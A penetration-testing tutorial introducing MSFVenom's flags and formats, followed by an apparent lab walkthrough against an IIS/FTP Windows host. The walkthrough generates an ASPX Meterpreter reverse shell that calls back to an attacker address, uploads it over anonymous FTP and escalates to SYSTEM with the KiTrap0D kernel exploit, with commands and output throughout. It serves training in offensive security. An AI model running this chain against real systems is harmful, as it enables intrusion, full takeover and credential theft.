# Introduction to MSFVenom

[MSFVenom](https://www.offsec.com/metasploit-unleashed/msfvenom/) is the unified successor to the two legacy tools `msfpayload` and `msfencode`, consolidating payload generation and encoding into a single command. Previously, generating a usable payload required piping the binary output of `msfpayload` into `msfencode`, which handled bad character removal and encoding scheme application as a second pass. MSFVenom performs both operations in a single invocation and supports a broad range of output formats suitable for delivery across web services, FTP, email, and custom exploit code.

## MSFVenom Flags

| Flag | Function |
|---|---|
| `-p <payload>` | Specify the payload to generate |
| `-f <format>` | Specify the output format |
| `-a <arch>` | Override the target architecture |
| `--platform <os>` | Override the target platform |
| `-e <encoder>` | Specify an encoder to apply |
| `-i <count>` | Number of encoding iterations |
| `-b <bytes>` | Bad characters to avoid in the payload output |
| `-n <length>` | Prepend a NOP sled of the specified length |
| `-o <file>` | Write output to a file instead of stdout |
| `-l payloads` | List all available payloads |
| `-l encoders` | List all available encoders |
| `-l formats` | List all available output formats |
| `--payload-options` | List the configurable options for the selected payload |

### Output Formats

MSFVenom supports two categories of output format:

- **Executable formats:** Self-contained files that run directly on the target. Examples include `exe`, `elf`, `macho`, `dll`, `aspx`, `aspx-exe`, `elf-so`, `msi`, `psh`, `hta-psh`, and `osx-app`.
- **Transform formats:** Shellcode rendered in a specific language or encoding for embedding into custom exploit code. Examples include `c`, `python`, `ruby`, `perl`, `raw`, `hex`, `base64`, `js_le`, `csharp`, and `vbs`.

## End-to-End Walkthrough: FTP to SYSTEM via IIS

The following walkthrough demonstrates a full attack chain using MSFVenom to generate a web shell payload, deliver it via an anonymous FTP service, and then escalate privileges using the `local_exploit_suggester` post-exploitation module.

### Step 1: Enumerate the Target

```bash
nmap -sV -T4 -p- 10.10.10.5

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
80/tcp open  http    Microsoft IIS httpd 7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Both FTP and IIS are running. The FTP service allows anonymous login, and the web root is accessible from the FTP directory:

```bash
ftp 10.10.10.5
Name: anonymous
Password: (blank)

ftp> ls
03-18-17  02:06AM    <DIR>  aspnet_client
03-17-17  05:37PM           689 iisstart.htm
03-17-17  05:37PM        184946 welcome.png
```

The presence of the `aspnet_client` directory confirms the server supports ASP.NET execution. This means `.aspx` payloads will execute server-side when requested through the web service.

### Step 2: Generate the ASPX Payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Payload size: 341 bytes
Final size of aspx file: 2819 bytes
```

When neither `-a` nor `--platform` is specified, MSFVenom infers them from the payload name. `windows/meterpreter/reverse_tcp` resolves to `x86/Windows` automatically. The resulting file is a staged Meterpreter reverse TCP payload wrapped in an ASPX web shell template.

### Step 3: Upload via FTP

```bash
ftp> put reverse_shell.aspx
```

The file is placed in the FTP root, which maps directly to the web root. It is immediately accessible at `http://10.10.10.5/reverse_shell.aspx`.

### Step 4: Configure and Start the Listener

Before triggering the payload, a `multi/handler` listener must be running on the correct host and port:

```bash
msf6 > use multi/handler
msf6 exploit(multi/handler) > set LHOST 10.10.14.5
msf6 exploit(multi/handler) > set LPORT 1337
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.5:1337
```

Navigating to `http://10.10.10.5/reverse_shell.aspx` in a browser triggers the payload. The page returns a blank response, as expected for an ASPX shell with no HTML output, while the callback arrives at the listener:

```bash
[*] Sending stage (176195 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.14.5:1337 -> 10.10.10.5:49157)

meterpreter > getuid
Server username: IIS APPPOOL\Web
```

The initial session lands as `IIS APPPOOL\Web`, a low-privilege IIS application pool identity with no administrative rights. If the session dies frequently, applying an encoder with `-e x86/shikata_ga_nai` during payload generation can improve stability by reducing runtime errors caused by bad characters in the shellcode.

### Step 5: Identify the Architecture

Running `sysinfo` confirms the target is a 32-bit Windows system:

```bash
meterpreter > sysinfo
OS: Windows Server 2008 R2 (Build 7600)
Architecture: x86
```

Architecture matters here because the `local_exploit_suggester` returns results filtered to the session's detected architecture. On an x86 session, only x86-compatible local exploits are suggested.

### Step 6: Run the Local Exploit Suggester

Background the session and run `post/multi/recon/local_exploit_suggester` against it:

```bash
meterpreter > bg
Background session 1? [y/N] y

msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
msf6 post(multi/recon/local_exploit_suggester) > run

[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
```

The `bypassuac_eventvwr` result fails immediately in this scenario because `IIS APPPOOL\Web` is not a member of the local Administrators group, and UAC bypass modules require an already-elevated user context to work from. The next viable candidate is `ms10_015_kitrap0d`.

### Step 7: Escalate to SYSTEM via KiTrap0D

`ms10_015_kitrap0d` exploits CVE-2010-0232, a vulnerability in the Windows kernel's Virtual DOS Machine (VDM) subsystem. The `KiTrap0D` handler in `win32k.sys` fails to properly validate access when a 16-bit application triggers a divide-by-zero exception, allowing an unprivileged process to execute code in the context of the SYSTEM account. The exploit is supported against Windows 2000 SP4 through Windows 7 x86 but does not function on 64-bit Windows editions:

```bash
msf6 > use exploit/windows/local/ms10_015_kitrap0d
msf6 exploit(windows/local/ms10_015_kitrap0d) > set SESSION 1
msf6 exploit(windows/local/ms10_015_kitrap0d) > set LHOST tun0
msf6 exploit(windows/local/ms10_015_kitrap0d) > set LPORT 1338
msf6 exploit(windows/local/ms10_015_kitrap0d) > run

[*] Launching notepad to host the exploit...
[+] Process 3552 launched.
[*] Reflectively injecting the exploit DLL into 3552...
[*] Meterpreter session 4 opened (10.10.14.5:1338 -> 10.10.10.5:49162)

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Note the use of a different `LPORT` (`1338`) for the privilege escalation payload. The original listener is still running on port `1337` catching the initial low-privilege session, so a separate port must be used for the new SYSTEM-level callback to avoid conflicts. With `NT AUTHORITY\SYSTEM` access, all subsequent post-exploitation actions, including `hashdump`, `lsa_dump_sam`, and process migration into any running process, are available without further restriction.
